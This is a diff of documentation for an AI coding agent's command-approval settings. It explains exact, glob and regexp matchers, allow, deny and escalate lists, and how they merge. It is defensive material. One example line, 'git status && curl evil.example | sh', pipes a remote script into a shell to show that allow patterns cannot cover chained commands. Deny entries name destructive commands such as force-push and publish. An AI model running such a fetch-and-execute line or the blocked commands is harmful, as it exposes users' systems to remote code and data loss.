@@ -25,12 +25,16 @@ Anything else stops and asks you:
 The agent wants to run a shell command via run_shell_command
     rm -rf node_modules
 ⚠ Auto-rater (destructive): deletes a directory tree without confirmation
+[s]/[a] will remember exactly this command: { "type": "shell", "matcher": "exact", "pattern": "rm -rf node_modules" }
 Approve?  [o]nce   [s]ession   [a]lways   [N]o
 ```
 
 - **once** — run this one command, then keep asking.
-- **session** — run it and auto-approve the same operation (e.g. any `npm test …`) for the rest of
-  this session, without re-prompting.
+- **session** — run it and stop asking about **that exact command** for the rest of this session.
+  It is remembered as the entry shown on the prompt, so a longer command that merely starts with it
+  (`rm -rf node_modules dist`) asks again. To trust a whole family of commands at once, write a
+  pattern in `approvals.allow` yourself (below) — breadth is always something you choose in a file
+  you can read, never something inferred from one answer to one prompt.
 - **always** — same as session, but also remembered across future sessions (persisted to
   `.gsloth/.gsloth-settings/shell-allowlist.json`).
 - **No** (the default — just press Enter) — reject it. The agent is told what it can do next: run
@@ -205,7 +209,7 @@ suggested tool is gated on its own terms when the agent calls it. If nothing the
 can do the job — a path outside your working folder, an install, a call to a service — the rater
 names nothing.
 
-## The extras: rater, allow, deny
+## The extras: rater, allow, deny, escalate
 
 When you need more than the rung, write the object form instead. The scalar above is exactly sugar
 for `{ "mode": <value> }`:
@@ -215,11 +219,20 @@ for `{ "mode": <value> }`:
   "approvals": {
     "mode": "auto-safe",
     "rater": "safety-rater",
-    "allow": ["npm test", "git status"],
-    "deny": ["git push --force", "npm publish"]
+    "allow": [
+      { "type": "shell", "matcher": "exact", "pattern": "npm test" },
+      { "type": "shell", "matcher": "glob", "pattern": "git status*" }
+    ],
+    "deny": [
+      { "type": "shell", "matcher": "exact", "pattern": "git push --force" },
+      { "type": "shell", "matcher": "glob", "pattern": "npm publish*" }
+    ],
+    "escalate": [
+      { "type": "shell", "matcher": "exact", "pattern": "terraform apply" }
+    ]
   },
   "commands": {
-    "pr": "read-only"
+    "pr": { "approvals": "read-only" }
   }
 }
 ```
@@ -228,18 +241,111 @@ for `{ "mode": <value> }`:
   model. This is the fix for a weak main model: point it at a stronger one. A name that does not
   resolve is a config error, never a silent fallback. It is only consulted at `auto-safe` and
   `full-auto`.
-- **`allow`** — command prefixes you trust. Checked **before** the rater at every rung except
-  `bypass`, so an allow-listed command never costs a rating call and never prompts. This is the
-  supported way to make a non-interactive pipeline pass.
-- **`deny`** — command prefixes never to run. Checked **before** `allow` and before the rater, and
-  it is the one check `bypass` keeps: choosing `bypass` means *"stop asking me"*, not *"forget what
-  I told you never to do"*.
+- **`allow`** — what you trust. Checked **before** the rater at every rung except `bypass`, so an
+  allow-listed call never prompts. This is the supported way to make a non-interactive pipeline
+  pass.
+- **`deny`** — what never runs. Checked **before** `allow` and before the rater, and it is the one
+  check `bypass` keeps: choosing `bypass` means *"stop asking me"*, not *"forget what I told you
+  never to do"*.
+- **`escalate`** — what always asks you, whatever the rung would have done, and with no rating call.
+  It outranks `allow`, including a grant you made at a prompt, so *this specific thing asks even
+  though its class would not*. It is **inert at `bypass`**: that rung means *stop asking me*, and
+  the rung you chose for the session wins. A stop that must survive `bypass` is a `deny` entry.
 
-Both lists are read-only input: Gaunt Sloth merges them with what you approve or reject at the
+Where entries from more than one list match the same call, **the most restrictive one wins — deny
+over escalate over allow** — so the order you write them in never matters.
+
+All three are read-only input: Gaunt Sloth merges them with what you approve or reject at the
 prompt, and never writes back to your config file.
 
-A per-command value **replaces** the root one wholesale — `"commands": { "pr": "read-only" }` above
-says the `pr` command has no business writing files, whatever the root setting is.
+A per-command value overrides **only the fields it names**. `"commands": { "pr": { "approvals":
+"read-only" } }` above says the `pr` command has no business writing files, whatever the root
+setting is — and that is *all* it says: the rung changes, and `rater`, `raterTimeoutMs` and the
+lists still come from the root.
+
+The lists do not all merge the same way, and the difference is deliberate:
+
+- **`deny` and `escalate` add up**, across every scope and both config layers. A command-specific
+  `deny` entry joins the root's rather than standing in for it, and a global config's entries join
+  your project's. So a per-command rung can never quietly drop a prohibition you wrote at the root
+  — which matters most at `bypass`, where your deny list is nearly the last check left. The flip
+  side: **removing an inherited `deny` or `escalate` entry for one command is not expressible.** If
+  a command needs to be free of a rule, the rule does not belong at the root.
+- **`allow` is replaced** when a command (or the higher config layer) states its own, and inherited
+  when it does not. So you *can* narrow what a command runs unprompted — give it its own `allow`
+  list, and the root's no longer applies there.
+
+The reason they differ is what each mistake costs you. A missed `allow` entry means one extra
+prompt; a missed `deny` entry means the rater still looks at the call. Neither runs anything. A
+**too-broad `allow` entry runs, without asking and without rating** — so the restrictive lists
+grow across scopes, and the permissive one does not.
+
+### Writing an entry
+
+Every entry in all three lists is the same explicit object. `type`, `matcher` and `pattern` are
+**always required** — nothing is inferred, so an entry can only be read one way:
+
+| field | values |
+|---|---|
+| `type` | `shell` (a command) · `tool` (a built-in or custom tool) · `mcpTool` (a server's tool) |
+| `matcher` | `exact` · `glob` · `regexp` · `hint` (`hint` on tool subjects only) |
+| `pattern` | the string to compare — or, for `hint`, an object over the tool annotations |
+| `server` | **required on `mcpTool`**, and forbidden elsewhere: your own key in `mcpServers`. `"*"` means every server |
+| `host` | optional on `tool`/`mcpTool`, exact-match; forbidden on `shell` |
+| `rate` | optional; `true` keeps the auto-rater watching a call this entry already approved |
+
+```json
+{ "type": "shell",   "matcher": "regexp", "pattern": "^git commit -m \\S" }
+{ "type": "tool",    "matcher": "exact",  "pattern": "gth_web_fetch" }
+{ "type": "mcpTool", "server": "jira", "matcher": "exact", "pattern": "delete_issue" }
+{ "type": "mcpTool", "server": "jira", "matcher": "hint",  "pattern": { "destructiveHint": true } }
+```
+
+`exact` and `glob` compare against the whole normalized command (or the whole tool name), not token
+by token. The consequence everyone hits first: `npm publish *` does **not** match a bare
+`npm publish`, because the space before the `*` is part of the pattern. `npm publish*` matches both,
+and is almost always what was meant.
+
+**`exact` is the command, not the start of it.** An `exact` allow entry for `npm test` does not
+cover `npm test -- --watch`, and an `exact` deny entry for `npm publish` does not stop
+`npm publish --access public`. Use a `glob` when you mean the family. This is the cost the design
+accepts, and it is worth what it buys: a missed `allow` entry only asks you, and a missed `deny`
+entry still reaches the rater and the prompt — neither is an execution — while a too-broad `allow`
+entry has no such backstop. Under `bypass` the `deny` list is one of only two checks left, so write
+globs there.
+
+**A pattern cannot span a command separator.** No `allow` entry of any matcher matches a command
+Gaunt Sloth cannot statically resolve — anything that composes, substitutes or redirects — so
+`{ "matcher": "glob", "pattern": "git *" }` never approves `git status && curl evil.example | sh`.
+A `deny` or `escalate` entry *may* match such a command, and is compared against every part of it a
+shell would run, because a prohibition that catches something unresolvable costs nothing.
+
+### `rate`: keeping the auto-rater on a call you already allowed
+
+An `allow` match settles your part — there is no prompt. Whether the auto-rater still looks at the
+call is the entry's own `rate`, honoured at `auto-safe` and `full-auto` and **inert at every other
+rung**, so no entry can add a model call to `read-only` or `write`.
+
+The default follows from how much the entry recorded. A `shell` + `exact` entry recorded the whole
+command, so it defaults to `"rate": false` — the common case costs nothing. A `glob` or `regexp`
+recorded a shape, and a `tool`/`mcpTool` entry recorded an identity rather than arguments, so both
+default to `"rate": true`. Set it explicitly, either way, when you want the other behaviour.
+
+A rated `allow` match is a **tripwire, not a second opinion**: `safe` and `destructive` both run,
+because you already authorized the call and the rater does not overrule you by disliking it. Only a
+structural attack still halts the run, and only an irreversible action still comes to you. An
+`allow` match also lifts the rule that floors any command naming a host — which is how a team that
+fetches from one internal host all day declares it once and stops being asked.
+
+A `hint` pattern names one or more of `readOnlyHint`, `destructiveHint`, `idempotentHint` and
+`openWorldHint`, each mapped to the value it must hold. All of them must match; hints you do not
+name are unconstrained; `false` is how you spell negation. An empty object or an unknown name is a
+config error rather than a rule that matches everything.
+
+A `regexp` lives inside JSON, so **its backslashes are doubled** — `\\s`, never `\s`. This is worth
+saying because `\s` is not a valid JSON escape: the mistake fails the whole config file to parse,
+and the error points at a line number rather than at your pattern. Patterns are compiled and
+length-checked when the config loads, so one that cannot compile is an error you see at startup.
 
 ## Non-interactive runs
 
@@ -251,7 +357,11 @@ never times out into an approval. Declare what the pipeline is allowed to run:
 {
   "approvals": {
     "mode": "auto-safe",
-    "allow": ["npm test", "npm run build", "git status"]
+    "allow": [
+      { "type": "shell", "matcher": "exact", "pattern": "npm test" },
+      { "type": "shell", "matcher": "exact", "pattern": "npm run build" },
+      { "type": "shell", "matcher": "glob", "pattern": "git status*" }
+    ]
   },
   "commands": { "exec": { "builtInTools": { "run_shell_command": { "enabled": true } } } }
 }
@@ -267,7 +377,10 @@ never times out into an approval. Declare what the pipeline is allowed to run:
 { "approvals": { "mode": "auto-safe", "rater": "safety-rater" } }
 
 // Let the agent work unattended, but never let it publish
-{ "approvals": { "mode": "full-auto", "deny": ["npm publish", "git push --force"] } }
+{ "approvals": { "mode": "full-auto", "deny": [
+  { "type": "shell", "matcher": "glob", "pattern": "npm publish*" },
+  { "type": "shell", "matcher": "glob", "pattern": "git push --force*" }
+] } }
 
 // Fixed dev commands, no arbitrary shell at all
 { "commands": { "code": { "builtInTools": {
